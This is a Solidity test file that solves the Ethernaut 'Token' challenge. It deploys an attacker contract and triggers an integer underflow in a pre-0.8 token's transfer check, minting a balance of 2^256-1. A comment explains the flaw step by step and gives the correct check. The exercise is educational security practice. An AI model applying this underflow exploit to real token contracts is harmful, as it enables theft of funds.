// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {DSTest} from "lib/ds-test/src/test.sol";
import {Token} from "../src/challenge-05-token/Token.sol";

contract Attacker {
    function transferToken(Token token, address to, uint256 value) external {
        token.transfer(to, value);
    }
}

contract TokenTest is DSTest {
    address receiver = address(0x100);
    Attacker attacker;
    Token token;

    function setUp() public {
        attacker = new Attacker();
        // Simulate the Ethernaut setup:
        // deployer starts with all supply 21.000.000, then transfer 20 tokens to attacker
        token = new Token(21_000_000);
        token.transfer(address(attacker), 20);
    }

    function testInitialSetup() public {
        assertEq(token.totalSupply(), 21_000_000);
        assertEq(token.balanceOf(address(attacker)), 20);
        assertEq(token.balanceOf(address(token)), 0);
        assertEq(token.balanceOf(address(this)), 20_999_980);
    }

    function testUnderflowExploit() public {
        attacker.transferToken(token, receiver, 21);

        uint256 attackerBalance = token.balanceOf(address(attacker));
        uint256 receiverBalance = token.balanceOf(receiver);

        assertEq(attackerBalance, 115792089237316195423570985008687907853269984665640564039457584007913129639935);
        assertEq(receiverBalance, 21);
    }
}

/*
    Initial state
        balances[attacker] = 20
        balances[receiver] = 0

    Exploit call
        attacker.transferToken(token, receiver, 21);

        This triggers:

        token.transfer(receiver, 21);

    --------------------------------------------------

    1. Require check

        require(balances[msg.sender] - _value >= 0);

        Here:
            msg.sender = attacker contract

        So:
            balances[msg.sender] = 20
            _value = 21

        The expression becomes:
            20 - 21

        In Solidity < 0.8, arithmetic is NOT checked.
        Instead of reverting, this causes an underflow.

        Result:
            20 - 21 = 2^256 - 1  (wrap-around)

        So the require becomes:
            require(2^256 - 1 >= 0)

        This is always true.

        👉 The check is ineffective because it happens AFTER the subtraction.

    --------------------------------------------------

    2. Subtraction

        balances[msg.sender] -= _value;

        Again:
            20 - 21 → underflow → 2^256 - 1

        Now:
            balances[attacker] = 2^256 - 1

        👉 The attacker now has an extremely large balance.

    --------------------------------------------------

    3. Addition to receiver

        balances[_to] += _value;

        balances[receiver] = 0 + 21 = 21

    --------------------------------------------------

    Final state

        balances[attacker] = 2^256 - 1
        balances[receiver] = 21

    --------------------------------------------------

    Key insight

        The contract checks:
            balances[msg.sender] - _value >= 0

        But:
            - uint256 cannot be negative
            - subtraction is performed BEFORE the check
            - underflow wraps the value instead of reverting

        Correct check should be:
            require(balances[msg.sender] >= _value);

        Or in Solidity >= 0.8:
            underflow would automatically revert

    --------------------------------------------------

    Conclusion

        The attacker exploits an underflow to:
            - bypass the require check
            - obtain a massive balance
            - effectively "mint" tokens out of thin air
*/